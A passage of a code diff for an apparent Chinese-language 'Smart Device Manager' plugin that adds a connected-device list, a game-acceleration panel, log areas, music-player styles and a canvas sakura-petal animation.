+                return '<span style="background:'+color+'22;color:'+color+';padding:1px 6px;border-radius:8px;font-size:.45rem;margin-right:4px;">'+a+'</span>'
+            }).join('')
+            const totalBytes = (d.txBytes || 0) + (d.rxBytes || 0)
+            const trafficInfo = totalBytes > 0 ? '<span style="font-size:.45rem;opacity:.5;color:#60a5fa;">流量:'+formatBytes(totalBytes) + (d.txBytes > 0 && d.rxBytes > 0 ? ' (↑'+formatBytes(d.txBytes)+' ↓'+formatBytes(d.rxBytes)+')' : '') + '</span>' : '<span style="font-size:.45rem;opacity:.5;">流量:'+formatBytes(d.txBytes)+'</span>'
+            const wifiTag = d.connType === 'wifi' ? '<span style="font-size:.4rem;opacity:.5;">📶 WiFi</span>' : ''
+            const macDisplay = maskMac(d.mac)
+            return '<div style="display:flex;align-items:center;gap:8px;padding:8px;margin-bottom:6px;border-radius:12px;background:rgba(255,158,205,.04);border:1px solid rgba(255,158,205,.06);' + (d.blocked ? 'opacity:.7;' : '') + '">' +
+                brandLogo +
+                '<div style="flex:1;min-width:0;">' +
+                    '<div style="display:flex;align-items:center;gap:4px;flex-wrap:wrap;">' +
+                        onlineDot +
+                        '<span style="font-size:.6rem;font-weight:bold;">'+(d.hostname || d.customName || modelText || ('设备'+(i+1)))+'</span>' +
+                        randomTag + gameTag + htTag + blockedTag +
+                    '</div>' +
+                    '<div style="font-size:.5rem;opacity:.5;margin-top:2px;">'+(modelText || d.brand || '未知型号')+' | '+macDisplay+' | '+(d.ip || '无IP')+'</div>' +
+                    '<div style="margin-top:3px;display:flex;flex-wrap:wrap;gap:3px;align-items:center;">'+appBadges+trafficInfo+wifiTag+'</div>' +
+                '</div>' +
+                '<div style="font-size:.45rem;opacity:.4;text-align:right;flex-shrink:0;">'+d.connections+'连接</div>' +
+            '</div>'
+        }).join('')
+        addDiagLog('扫描完成: '+devices.length+'台设备 (热点监控'+(hotspotData && hotspotData.devices ? Object.keys(hotspotData.devices).length : 0)+'台, 守护进程:'+(daemonRunning?'运行':'未运行')+')', 'net')
+    }
+
+    const mmContainer = document.querySelector('.functions-container') || document.body
+    const _bs = 'border:none;border-radius:12px;font-weight:bold;color:white;cursor:pointer;'
+    /* 【字体修复】_tg 渐变文字改为 CSS 类 + @supports 回退，
+       不支持 background-clip:text 的 WebView 会显示纯色而非透明消失 */
+    const _tg = '' // 不再使用内联样式，改用 class="smart-grad-text"
+    mmContainer.insertAdjacentHTML("afterend", `<style>
+@keyframes smart_pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}
+@keyframes petal_fall{0%{transform:translate(0,-20px) rotate(0deg);opacity:1}10%{transform:translate(3px,10vh) rotate(36deg)}25%{transform:translate(-4px,25vh) rotate(90deg)}50%{transform:translate(4px,50vh) rotate(180deg)}75%{transform:translate(-3px,75vh) rotate(270deg)}100%{transform:translate(var(--drift,8px),105vh) rotate(360deg);opacity:.4}}
+@keyframes smart_btn_glow{0%,100%{box-shadow:0 2px 8px rgba(255,255,255,.15),0 0 0 1px rgba(255,255,255,.08)}50%{box-shadow:0 4px 16px rgba(255,255,255,.25),0 0 0 1px rgba(255,255,255,.15)}}
+@keyframes smart_btn_shine{0%{background-position:-200% center}100%{background-position:200% center}}
+/* 【字体修复】渐变文字：支持 background-clip:text 时显示渐变动画，不支持时回退纯色 */
+.smart-grad-text {
+    color: #ff9ecd;
+    font-weight: bold;
+    background: linear-gradient(90deg,#ff9ecd,#a78bfa,#4ade80,#ff9ecd);
+    background-size: 200% auto;
+    animation: smart_btn_shine 4s linear infinite;
+}
+@supports (-webkit-background-clip: text) or (background-clip: text) {
+    .smart-grad-text {
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+    }
+}
+@keyframes smart_action_ripple{0%{transform:scale(0);opacity:.6}100%{transform:scale(2.5);opacity:0}}
+#smart_sakura_container{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9999;overflow:hidden}
+#smart_sakura_canvas{position:absolute;top:0;left:0;width:100%;height:100%;display:block}
+.smart_sakura{position:absolute;top:0;left:0;animation:petal_fall linear infinite;will-change:transform,opacity;filter:drop-shadow(0 0 2px rgba(255,182,193,.4))}
+.smart_action_btn{position:relative;overflow:hidden;border:none;border-radius:14px;font-weight:bold;cursor:pointer;transition:all .25s ease;animation:smart_btn_glow 3s ease-in-out infinite}
+.smart_action_btn:active{transform:scale(.93)}
+.smart_action_btn::after{content:'';position:absolute;top:50%;left:50%;width:0;height:0;border-radius:50%;background:rgba(255,255,255,.3);transform:translate(-50%,-50%);pointer-events:none}
+.smart_action_btn:active::after{width:120px;height:120px;transition:width .4s ease,height .4s ease,opacity .4s ease;animation:smart_action_ripple .5s ease-out}
+.smart_shine_text{background:linear-gradient(90deg,rgba(255,255,255,.5) 0%,rgba(255,255,255,1) 50%,rgba(255,255,255,.5) 100%);background-size:200% auto;background-clip:text;-webkit-background-clip:text;-webkit-text-fill-color:transparent;animation:smart_btn_shine 3s linear infinite}
+/* 作者开关样式 */
+.smart-author-switch{position:relative;width:32px;height:18px;border-radius:9px;background:rgba(255,255,255,.15);cursor:pointer;transition:background .25s;flex-shrink:0;display:inline-block;vertical-align:middle;}
+.smart-author-switch._on{background:linear-gradient(135deg,#a78bfa,#ec4899);}
+.smart-author-switch::after{content:'';position:absolute;top:2px;left:2px;width:14px;height:14px;border-radius:50%;background:#fff;transition:transform .25s;}
+.smart-author-switch._on::after{transform:translateX(14px);}
+/* 小宇点击特效 */
+@keyframes smart_xiaoyu_pop{0%{opacity:0;transform:translate(-50%,-50%) scale(.3)}30%{opacity:1;transform:translate(-50%,-50%) scale(1.3)}70%{opacity:1;transform:translate(-50%,-50%) scale(1)}100%{opacity:0;transform:translate(-50%,-80%) scale(1.6)}}
+.smart-xiaoyu-text{position:fixed;font-size:1.3rem;font-weight:bold;background:linear-gradient(135deg,#ff9ecd,#a78bfa,#60a5fa);-webkit-background-clip:text;background-clip:text;-webkit-text-fill-color:transparent;pointer-events:none;z-index:99999;text-shadow:0 0 12px rgba(167,139,250,.4);animation:smart_xiaoyu_pop .5s ease-out forwards;filter:drop-shadow(0 2px 4px rgba(0,0,0,.3));}
+/* 后台播放开关样式 */
+.sm-bg-switch{position:relative;width:36px;height:20px;border-radius:10px;background:rgba(255,255,255,.15);cursor:pointer;transition:background .25s;flex-shrink:0;display:inline-block;vertical-align:middle;}
+.sm-bg-switch._on{background:linear-gradient(135deg,#10b981,#059669);}
+.sm-bg-switch::after{content:'';position:absolute;top:2px;left:2px;width:16px;height:16px;border-radius:50%;background:#fff;transition:transform .25s;box-shadow:0 1px 3px rgba(0,0,0,.3);}
+.sm-bg-switch._on::after{transform:translateX(16px);}
+/* ADB设备播放区域样式 */
+.sm-adb-section{padding:10px 12px;border-radius:12px;margin:8px 0;background:linear-gradient(135deg,rgba(59,130,246,.08),rgba(99,102,241,.04));border:1px solid rgba(59,130,246,.15);}
+.sm-adb-btn{font-size:.55rem;padding:7px 14px;border-radius:10px;border:none;cursor:pointer;color:#fff;background:linear-gradient(135deg,#3b82f6,#6366f1);transition:all .2s;}
+.sm-adb-btn:active{transform:scale(.95);}
+.sm-adb-btn._playing{background:linear-gradient(135deg,#10b981,#059669);}
+.sm-adb-status{font-size:.5rem;opacity:.6;margin-top:6px;text-align:center;}
+/* 小窗模式样式 */
+#smart_music_panel._mini{
+  width:300px !important;
+  height:auto !important;
+  max-height:200px !important;
+  padding:10px 12px !important;
+  border-radius:16px !important;
+  position:fixed !important;
+  top:80px !important;
+  right:20px !important;
+  left:auto !important;
+  bottom:auto !important;
+  transform:none !important;
+  z-index:9999 !important;
+  cursor:move !important;
+  box-shadow:0 8px 32px rgba(0,0,0,.4) !important;
+}
+#smart_music_panel._mini .sm-header{padding:0 0 6px 0;margin-bottom:6px;}
+#smart_music_panel._mini .sm-header .sm-title{font-size:.7rem;}
+#smart_music_panel._mini .sm-section{padding:0 !important;border:none !important;}
+#smart_music_panel._mini .sm-now-playing{font-size:.6rem;padding:4px 0;}
+#smart_music_panel._mini .sm-controls{gap:4px;}
+#smart_music_panel._mini .sm-controls .sm-btn{font-size:12px;padding:4px 8px;min-width:36px;}
+#smart_music_panel._mini .sm-controls .sm-btn-play{min-width:60px !important;}
+#smart_music_panel._mini .sm-seek-wrap{margin-top:4px;}
+#smart_music_panel._mini .sm-tab-bar,
+#smart_music_panel._mini #sm_playlist_tab,
+#smart_music_panel._mini #sm_favorites_tab,
+#smart_music_panel._mini #sm_lyrics_tab,
+#smart_music_panel._mini .sm-vol-wrap,
+#smart_music_panel._mini .sm-adb-section,
+#smart_music_panel._mini #sm_bg_switch{display:none !important;}
+/* 迷你模式下保留自动续播开关 */
+#smart_music_panel._mini #sm_autoplay_switch{
+  display:inline-block !important;
+  width:28px !important;
+  height:16px !important;
+}
+#smart_music_panel._mini #sm_autoplay_switch::after{
+  width:12px !important;
+  height:12px !important;
+}
+#smart_music_panel._mini #sm_autoplay_switch._on::after{
+  transform:translateX(12px) !important;
+}
+#smart_music_panel._mini .sm-autoplay-label{
+  display:inline !important;
+  font-size:.5rem !important;
+  opacity:.6 !important;
+}
+#smart_music_panel._mini .sm-minimize-btn{
+  display:inline-block;
+  margin-right:6px;
+  cursor:pointer;
+  font-size:.7rem;
+  opacity:.7;
+}
+#smart_music_panel._mini .sm-minimize-btn:hover{opacity:1;}
+.sm-minimize-btn{
+  display:inline-block;
+  margin-right:6px;
+  cursor:pointer;
+  font-size:.65rem;
+  opacity:.5;
+  transition:opacity .2s;
+}
+.sm-minimize-btn:hover{opacity:1;}
+</style><div id="smart_sakura_container"><canvas id="smart_sakura_canvas"></canvas></div>
+<div id="IFRAME_SMART" style="width:100%;margin-top:10px;">
+    <div class="title" style="margin:6px 0;">
+        <strong class="smart-grad-text">🌸 智能设备管理器</strong>
+        <span style="font-size:.4rem;opacity:.8;margin-left:6px;background:linear-gradient(135deg,#ff9ecd,#c44fc4);color:white;padding:2px 8px;border-radius:10px;box-shadow:0 2px 6px rgba(255,158,205,.3);">用户插件</span>
+        <span style="font-size:.55rem;font-weight:bold;margin-left:8px;background:linear-gradient(135deg,#3b82f6,#1d4ed8);color:white;padding:2px 10px;border-radius:10px;box-shadow:0 2px 8px rgba(59,130,246,.4);border:1px solid rgba(147,197,253,.3);">📦 v${PLUGIN_VERSION}</span>
+        <span id="sdm_check_update_btn" style="font-size:.45rem;font-weight:bold;margin-left:4px;color:#34d399;cursor:pointer;background:rgba(52,211,153,.12);border:1px solid rgba(52,211,153,.3);padding:2px 8px;border-radius:8px;transition:all .2s;" onmouseover="this.style.background='rgba(52,211,153,.25)'" onmouseout="this.style.background='rgba(52,211,153,.12)'">🔄 检查更新</span>
+        <span style="font-size:.4rem;opacity:.35;margin-left:4px">QQ 1085465022</span>
+        <span style="display:inline-flex;align-items:center;gap:3px;margin-left:6px;vertical-align:middle;">
+            <span style="font-size:.4rem;opacity:.5;">作者</span>
+            <span class="smart-author-switch" id="smart_author_switch"></span>
+        </span>
+        <span id="smart_author_display" style="display:none;font-size:.4rem;margin-left:4px;background:linear-gradient(135deg,#a78bfa,#ec4899);color:white;padding:2px 8px;border-radius:8px;font-weight:bold;">✨ 小宇同学</span>
+        <span id="smart_sakura_toggle" style="display:inline-block;font-size:.5rem;font-weight:bold;color:white;cursor:pointer;margin-left:6px;background:linear-gradient(135deg,#ec4899,#f472b6);padding:4px 14px;border-radius:14px;border:1px solid rgba(255,182,193,.5);box-shadow:0 2px 10px rgba(236,72,153,.35);transition:all .25s;">🌸 樱花</span>
+        <div style="display:inline-block;" id="collapse_SMART_btn"></div>
+    </div>
+    <div class="collapse" id="collapse_SMART" data-name="close" style="height:0px;overflow:hidden;">
+    <div class="collapse_box">
+        <div id="smart_game_boost_panel" style="padding:14px;margin-bottom:10px;border-radius:18px;background:linear-gradient(135deg,rgba(74,222,128,.08),rgba(34,197,94,.06),rgba(167,139,250,.06));border:1px solid rgba(74,222,128,.2);">
+            <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px;">
+                <div style="display:flex;align-items:center;gap:8px;">
+                    <div style="width:40px;height:40px;border-radius:50%;background:linear-gradient(135deg,#4ade80,#22c55e,#4ade80);display:flex;align-items:center;justify-content:center;font-size:1.1rem;box-shadow:0 2px 12px rgba(74,222,128,.4);">🎮</div>
+                    <div>
+                        <div style="font-size:.7rem;" class="smart-grad-text">游戏自动加速</div>
+                        <div style="font-size:.5rem;opacity:.5;">状态: <span id="smart_boost_status">待机中</span></div>
+                    </div>
+                </div>
+                <span style="font-size:.45rem;opacity:.4;">检测到游戏自动开启</span>
+            </div>
+            <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px;">
+                <div style="padding:10px;border-radius:12px;background:rgba(74,222,128,.08);text-align:center;border:1px solid rgba(74,222,128,.1);">
+                    <div style="font-size:.45rem;opacity:.5;">当前游戏</div>
+                    <div style="font-size:.6rem;font-weight:bold;color:#4ade80;" id="smart_current_game">无</div>
+                    <div style="font-size:.4rem;opacity:.4;" id="smart_boost_pkg">-</div>
+                </div>
+                <div style="padding:10px;border-radius:12px;background:rgba(167,139,250,.08);text-align:center;border:1px solid rgba(167,139,250,.1);">
+                    <div style="font-size:.45rem;opacity:.5;">加速时长</div>
+                    <div style="font-size:.6rem;font-weight:bold;color:#a78bfa;" id="smart_boost_duration">0s</div>
+                </div>
+                <div style="padding:10px;border-radius:12px;background:rgba(251,191,36,.08);text-align:center;border:1px solid rgba(251,191,36,.1);">
+                    <div style="font-size:.45rem;opacity:.5;">丢包修复率</div>
+                    <div style="font-size:.6rem;font-weight:bold;color:#fbbf24;" id="smart_repair_rate">0%</div>
+                </div>
+            </div>
+            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:8px;">
+                <div style="padding:8px;border-radius:12px;background:rgba(96,165,250,.08);text-align:center;border:1px solid rgba(96,165,250,.1);">
+                    <div style="font-size:.45rem;opacity:.5;">延迟改善</div>
+                    <div style="font-size:.55rem;font-weight:bold;color:#60a5fa;" id="smart_latency_improve">0ms</div>
+                </div>
+                <div style="padding:8px;border-radius:12px;background:rgba(255,158,205,.08);text-align:center;border:1px solid rgba(255,158,205,.1);">
+                    <div style="font-size:.45rem;opacity:.5;">丢包基线</div>
+                    <div style="font-size:.55rem;font-weight:bold;color:#ff9ecd;" id="smart_loss_before">0%</div>
+                </div>
+            </div>
+            <div style="font-size:.4rem;opacity:.4;margin-top:6px;text-align:center;">打开游戏自动检测并加速，优先游戏流量，实时监控丢包修复率和延迟改善</div>
+        </div>
+        <div style="padding:14px;margin-bottom:10px;">
+            <div class="title" style="font-size:.7rem;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;">
+                <span class="smart-grad-text">📡 已连接设备</span>
+                <div style="display:flex;align-items:center;gap:6px;">
+                    <span style="font-size:.55rem;opacity:.5;">共 <span id="smart_device_count">0</span> 台</span>
+                    <select id="smart_scan_interval" style="font-size:.45rem;padding:2px 6px;border-radius:8px;border:1px solid rgba(255,158,205,.2);background:rgba(255,158,205,.08);color:rgba(255,255,255,.8);outline:none;">
+                        <option value="3000">3秒</option>
+                        <option value="5000">5秒</option>
+                        <option value="10000" selected>10秒</option>
+                        <option value="15000">15秒</option>
+                        <option value="30000">30秒</option>
+                    </select>
+                    <button style="${_bs}background:linear-gradient(135deg,#60a5fa,#3b82f6);font-size:.45rem;padding:3px 10px;" id="smart_refresh_now">🔄 刷新</button>
+                </div>
+            </div>
+            <div id="smart_scan_list" style="max-height:300px;overflow-y:auto;">
+                <div style="text-align:center;padding:20px;opacity:.5;font-size:.6rem">点击刷新按钮扫描设备</div>
+            </div>
+        </div>
+        <div style="padding:14px;margin-bottom:10px;">
+            <div class="title" style="font-size:.7rem;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;">
+                <span class="smart-grad-text">📜 活动日志</span>
+                <button style="${_bs}background:linear-gradient(135deg,#fb7185,#ef4444);font-size:.45rem;padding:3px 10px;" id="smart_clear_log">清空</button>
+            </div>
+            <textarea id="smart_log_area" disabled style="font-size:.5rem !important;border:none;padding:8px;margin:0;width:100%;height:120px;border-radius:12px;overflow-x:hidden;background:rgba(0,0,0,.12);color:rgba(255,255,255,.6);border:1px solid rgba(255,158,205,.08);" placeholder="暂无日志"></textarea>
+        </div>
+        <div style="padding:14px;border-radius:18px;margin-bottom:10px;border:1px solid rgba(255,158,205,.18);background:linear-gradient(135deg,rgba(255,158,205,.06),rgba(196,79,196,.04),rgba(167,139,250,.03));">
+            <div class="title" style="font-size:.7rem;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;">
+                <span class="smart-grad-text">📊 网络诊断日志</span>
+                <button id="smart_clear_diaglog" style="font-size:.45rem;padding:3px 10px;${_bs}background:linear-gradient(135deg,#fb7185,#ef4444);">清空</button>
+            </div>
+            <textarea id="smart_diag_log" disabled style="font-size:.5rem !important;border:none;padding:8px;margin:0;width:100%;height:100px;border-radius:12px;overflow-x:hidden;background:rgba(0,0,0,.12);color:rgba(255,255,255,.6);border:1px solid rgba(255,158,205,.08);" placeholder="暂无诊断日志"></textarea>
+        </div>
+        <div style="padding:14px;border-radius:18px;margin-bottom:10px;border:1px solid rgba(96,165,250,.18);background:linear-gradient(135deg,rgba(96,165,250,.06),rgba(59,130,246,.04),rgba(167,139,250,.03));">
+            <div class="title" style="font-size:.7rem;margin-bottom:10px;display:flex;justify-content:space-between;align-items:center;">
+                <span class="smart-grad-text">📝 插件讲解</span>
+            </div>
+            <div style="padding:16px 12px;font-size:.6rem;line-height:1.8;color:rgba(255,255,255,.75);text-align:center;">
+                <div style="font-size:.65rem;font-weight:bold;margin-bottom:10px;background:linear-gradient(135deg,#60a5fa,#a78bfa);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">📖 插件简介</div>
+                <div style="margin-bottom:12px;">本插件制作于小宇同学</div>
+                <div style="padding:10px 14px;border-radius:12px;background:rgba(96,165,250,.08);border:1px solid rgba(96,165,250,.15);margin-bottom:10px;">
+                    <div style="font-size:.55rem;opacity:.6;margin-bottom:4px;">联系方式</div>
+                    <div style="font-size:.6rem;font-weight:bold;color:#60a5fa;">QQ：1085465022</div>
+                    <div style="font-size:.5rem;opacity:.5;margin-top:4px;">有问题QQ联系</div>
+                </div>
+                <div style="font-size:.5rem;opacity:.4;">感谢使用本插件 ✨</div>
+            </div>
+        </div>
+        <div id="SMART_action_box" style="margin-bottom:10px;display:flex;gap:8px;flex-wrap:wrap"></div>
+        <div style="margin-top:8px;text-align:right;font-size:.45rem;opacity:.7;">Smart Device Manager <span style="font-weight:bold;background:linear-gradient(135deg,#3b82f6,#1d4ed8);color:white;padding:1px 8px;border-radius:8px;font-size:.45rem;box-shadow:0 1px 6px rgba(59,130,246,.3);border:1px solid rgba(147,197,253,.2);">v${PLUGIN_VERSION}</span> <span style="opacity:.6;">QQ 1085465022</span></div>
+    </div>
+    </div>
+    </div>`)
+
+
+
+    // ============ 花瓣雨效果（canvas 版·小白菜登录页风格） ============
+    const PETAL_COLORS = ['#ffb6c1', '#ff9ecd', '#ffc0cb', '#ffb7d5', '#ff91a4', '#ffaec0', '#ff8fab', '#ffd6e8']
+    let _sakuraRaf = null
+    let _sakuraSpawnTimer = null
+    let _sakuraEnabled = true
+    let _sakuraPetals = []
+    let _sakuraCanvas = null
+    let _sakuraCtx = null
+    let _sakuraW = 0
+    let _sakuraH = 0
+    let _sakuraLastTs = 0
+
+    // 从 localStorage 恢复花瓣雨开关状态
+    try {
+        var _savedSakura = localStorage.getItem('smart_sakura_enabled')
+        if (_savedSakura !== null) _sakuraEnabled = _savedSakura === '1'
+    } catch(e) {}
+
+    // 初始化 canvas（懒加载，确保容器存在后调用）
+    const _sakuraEnsureCanvas = () => {
+        if (_sakuraCanvas) return
+        var container = document.querySelector('#smart_sakura_container')
+        if (!container) return
+        _sakuraCanvas = document.getElementById('smart_sakura_canvas')
+        if (!_sakuraCanvas) {
+            _sakuraCanvas = document.createElement('canvas')
+            _sakuraCanvas.id = 'smart_sakura_canvas'
+            _sakuraCanvas.style.cssText = 'position:absolute;top:0;left:0;width:100%;height:100%;display:block'
+            container.appendChild(_sakuraCanvas)
+        }
+        _sakuraCtx = _sakuraCanvas.getContext('2d')
+        _sakuraResize()
+        window.addEventListener('resize', _sakuraResize)
+    }
+
+    const _sakuraResize = () => {
+        if (!_sakuraCanvas) return
+        var dpr = window.devicePixelRatio || 1
+        _sakuraW = window.innerWidth
+        _sakuraH = window.innerHeight
+        _sakuraCanvas.width = Math.floor(_sakuraW * dpr)
+        _sakuraCanvas.height = Math.floor(_sakuraH * dpr)
+        _sakuraCanvas.style.width = _sakuraW + 'px'
+        _sakuraCanvas.style.height = _sakuraH + 'px'
+        if (_sakuraCtx) _sakuraCtx.setTransform(dpr, 0, 0, dpr, 0, 0)
+    }
+
+    // 生成一个花瓣（小白菜风格：缓慢、轻摇、随机旋转）
+    const _sakuraSpawn = () => {
+        if (!_sakuraCtx) return
+        var w = _sakuraW || window.innerWidth
+        var h = _sakuraH || window.innerHeight
+        // 覆盖全宽出生，让雨帘更均匀
+        var size = 7 + Math.random() * 9
+        _sakuraPetals.push({
+            x: Math.random() * w,
+            y: -size - Math.random() * h * 0.15,
+            size: size,
+            color: PETAL_COLORS[Math.floor(Math.random() * PETAL_COLORS.length)],
+            // 速度：慢而柔，越往下越接近小白菜那种轻盈感
+            vx: (Math.random() * 1.2 - 0.6),          // 水平漂移
+            vy: (0.6 + Math.random() * 1.2),           // 下落速度(px/帧@60fps)
+            rot: Math.random() * Math.PI * 2,           // 初始旋转角
+            vrot: (Math.random() * 0.04 - 0.02),        // 旋转速度
+            sway: Math.random() * 0.02 + 0.006,         // 摇摆幅度
+            swayPhase: Math.random() * Math.PI * 2,     // 摇摆相位
+            opacity: 0.5 + Math.random() * 0.5,
+            // 碰撞状态
+            state: 'fall',          // fall 下落 / rest 停在按钮上 / slide 沿按钮惯性滑落
+            restRect: null,         // 停在的按钮矩形 {l,t,r,b}
+            restOffset: 0,          // 停在按钮顶边的垂直堆叠偏移
+            restWait: 0,            // 停留计时(帧数)
+            slideVx: 0              // 惯性滑落水平速度
+        })
+    }
+
+    // 绘制一朵五瓣樱花
+    const _sakuraDrawPetal = (ctx, p) => {
+        ctx.save()
+        ctx.translate(p.x, p.y)
+        ctx.rotate(p.rot)
+        ctx.globalAlpha = p.opacity
+        var s = p.size
+        var c = p.color
+        // 花瓣渐变
+        var grad = ctx.createRadialGradient(0, 0, s * 0.2, 0, 0, s)
+        grad.addColorStop(0, c)
+        grad.addColorStop(0.7, c + 'cc')
+        grad.addColorStop(1, c + '77')
+        ctx.fillStyle = grad
+        ctx.beginPath()
+        // 用贝塞尔曲线画一片花瓣（泪滴形）
+        ctx.moveTo(0, 0)
+        ctx.bezierCurveTo(s * 0.8, -s * 0.6, s * 0.9, s * 0.2, 0, s)
+        ctx.bezierCurveTo(-s * 0.9, s * 0.2, -s * 0.8, -s * 0.6, 0, 0)
+        ctx.closePath()
+        ctx.fill()
+        // 高光
+        ctx.strokeStyle = 'rgba(255,255,255,.35)'
+        ctx.lineWidth = 0.6
+        ctx.beginPath()
+        ctx.moveTo(0, s * 0.15)
+        ctx.bezierCurveTo(s * 0.3, s * 0.1, s * 0.35, s * 0.4, 0, s * 0.75)
+        ctx.stroke()
+        ctx.restore()
+    }
+
+    // 缓存页面上的目标元素碰撞体矩形（中间圆形按钮 / 游戏加速按钮 / 音乐播放器）
+    let _sakuraColliders = []
+    let _sakuraColliderTs = 0
+    // 每个碰撞体上当前堆叠的花瓣索引组 { rectId: [petal, ...] }
+    let _sakuraPiles = {}
+
+    // 目标元素：工具栏「更新内容」按钮、「游戏加速」按钮
+    const _sakuraTargetSelectors = [
+        { id: 'float_btn',    sel: '#_smart_announce_btn' },
+        { id: 'game_boost',   sel: '#_smart_game_btn' }
+    ]
+
+    const _sakuraCollectColliders = () => {
+        var now = Date.now()
+        // 每 600ms 刷新一次碰撞体（按钮位置/可见性可能变化）
+        if (now - _sakuraColliderTs < 600) return _sakuraColliders
+        _sakuraColliderTs = now
+        _sakuraColliders = []
+        try {
+            for (var i = 0; i < _sakuraTargetSelectors.length; i++) {
+                var t = _sakuraTargetSelectors[i]
+                var el = document.getElementById(t.id === 'float_btn' ? '_smart_announce_btn' : '_smart_game_btn')
+                if (!el || !el.getBoundingClientRect) continue
+                var style = window.getComputedStyle(el)
+                if (style.display === 'none' || style.visibility === 'hidden') continue
+                var rect = el.getBoundingClientRect()
+                if (rect.width < 4 || rect.height < 4) continue
+                if (rect.top > _sakuraH + 40 || rect.bottom < -40) continue
+                _sakuraColliders.push({ id: t.id, l: rect.left, t: rect.top, r: rect.right, b: rect.bottom })
+            }
+        } catch(e) {}
+        return _sakuraColliders
+    }
+
+    // 渲染循环
+    const _sakuraLoop = (ts) => {
+        if (!_sakuraEnabled) { _sakuraRaf = null; return }
+        if (!_sakuraCtx) { _sakuraRaf = null; return }
+        // 清理
+        _sakuraCtx.clearRect(0, 0, _sakuraW, _sakuraH)
+        // 按帧间隔推进位置（兼容不同刷新率）
+        var dt = 1
+        if (_sakuraLastTs) dt = Math.min((ts - _sakuraLastTs) / 16.7, 3)
+        _sakuraLastTs = ts
+
+        // 收集目标碰撞体（含缓存）
+        var colliders = _sakuraCollectColliders()
+
+        // 本轮先重置所有堆叠引用（下面重建）
+        for (var k in _sakuraPiles) delete _sakuraPiles[k]
+
+        for (var i = _sakuraPetals.length - 1; i >= 0; i--) {
+            var p = _sakuraPetals[i]
+            p.swayPhase += p.sway * dt
+
+            if (p.state === 'fall') {
+                // —— 下落：先移动，再检测是否撞到目标元素顶边（不穿过） ——
+                var nx = p.x + (p.vx + Math.sin(p.swayPhase) * 0.5) * dt
+                var ny = p.y + p.vy * dt
+                p.x = nx; p.y = ny
+                p.rot += p.vrot * dt
+
+                // 严格碰撞：花瓣中心水平落在元素范围内，且从上方压到元素顶边 → 停住（不会穿过）
+                if (colliders.length > 0) {
+                    for (var c = 0; c < colliders.length; c++) {
+                        var r = colliders[c]
+                        // 花瓣中心在元素水平范围内（考虑花瓣半径，稍微内缩，保证看起来贴合）
+                        if (nx >= r.l - p.size * 0.4 && nx <= r.r + p.size * 0.4) {
+                            var prevY = p.y - p.vy * dt
+                            // 上一帧在元素顶边上方，本帧到达/越过顶边 → 停在其上沿
+                            if (prevY <= r.t + p.size * 0.5 && ny >= r.t - p.size) {
+                                p.state = 'rest'
+                                p.restRect = r
+                                p.restId = r.id
+                                p.restOffset = 0
+                                p.y = r.t - p.size - p.restOffset
+                                // 随机停留时长（60~200帧，堆积更明显）
+                                p.restWait = 60 + Math.random() * 140
+                                p.slideVx = p.vx + (Math.random() * 0.6 - 0.3)
+                                p.vx = 0
+                                // 归入该元素堆叠组
+                                if (!_sakuraPiles[r.id]) _sakuraPiles[r.id] = []
+                                _sakuraPiles[r.id].push(p)
+                                break
+                            }
+                        }
+                    }
+                }
+
+                // 越界移除（正常下落时）
+                if (p.y > _sakuraH + p.size * 2 || p.x < -p.size * 3 || p.x > _sakuraW + p.size * 3) {
+                    _sakuraPetals.splice(i, 1)
+                    continue
+                }
+            } else if (p.state === 'rest') {
+                // —— 停在目标元素上：堆积，按堆叠顺序上移，等待后整组惯性滑落 ——
+                // 重新登记到堆叠组（用 restId 索引）
+                if (p.restId && !_sakuraPiles[p.restId]) _sakuraPiles[p.restId] = []
+                if (p.restId) _sakuraPiles[p.restId].push(p)
+
+                // 按登记顺序重排纵坐标，让花瓣一层层堆叠（不重叠）
+                if (p.restId && _sakuraPiles[p.restId].length > 1) {
+                    var _pile = _sakuraPiles[p.restId]
+                    var _rt = p.restRect ? p.restRect.t : 0
+                    for (var _pi = 0; _pi < _pile.length; _pi++) {
+                        var _pp = _pile[_pi]
+                        _pp.y = _rt - _pp.size - _pi * (_pp.size * 0.7)
+                    }
+                }
+
+                p.restWait -= dt
+                var wind = Math.sin(p.swayPhase) * 0.5
+                // 触发滑落：停留结束，或横向风足够大，或堆叠达到阈值
+                var pileCount = (p.restId && _sakuraPiles[p.restId]) ? _sakuraPiles[p.restId].length : 1
+                var threshold = 12   // 堆叠到一定数量后滑落
+                if (p.restWait <= 0 || Math.abs(wind) > 0.5 || pileCount >= threshold) {
+                    p.state = 'slide'
+                    // 惯性力：堆得越多，下滑水平速度越大（像被挤压推出）
+                    var inertia = 1 + Math.min(pileCount, 12) * 0.15
+                    p.slideVx = (p.vx + wind * 2 + (Math.random() * 0.6 - 0.3)) * inertia
+                    p.vx = p.slideVx
+                    p.vy = Math.max(p.vy, 0.9)
+                    p.slideTriggered = true
+                }
+                p.rot += p.vrot * dt * 0.3
+            } else if (p.state === 'slide') {
+                // —— 沿元素惯性滑落：带水平惯性，像被力推着滑下 ——
+                p.swayPhase += p.sway * dt
+                p.vy += 0.06 * dt
+                // 水平惯性逐渐衰减，但有初始冲击力
+                p.slideVx *= 0.99
+                p.slideVx += Math.sin(p.swayPhase) * 0.04 * dt
+                p.vx = p.slideVx
+                p.x += p.vx * dt
+                p.y += p.vy * dt
+                p.rot += p.vrot * dt
+                // 滑出目标元素底部后转回普通下落
+                if (p.restRect && p.y > (p.restRect.b + p.size)) {
+                    p.state = 'fall'
+                    p.restRect = null
+                    p.restId = null
+                    p.slideTriggered = false
+                }
+                // 越界移除
+                if (p.y > _sakuraH + p.size * 2 || p.x < -p.size * 3 || p.x > _sakuraW + p.size * 3) {
+                    _sakuraPetals.splice(i, 1)
+                    continue
+                }
+            }
+
+            _sakuraDrawPetal(_sakuraCtx, p)
+        }
+        _sakuraRaf = requestAnimationFrame(_sakuraLoop)
+    }
+
+    const startSakuraRain = () => {
+        if (!_sakuraEnabled) return
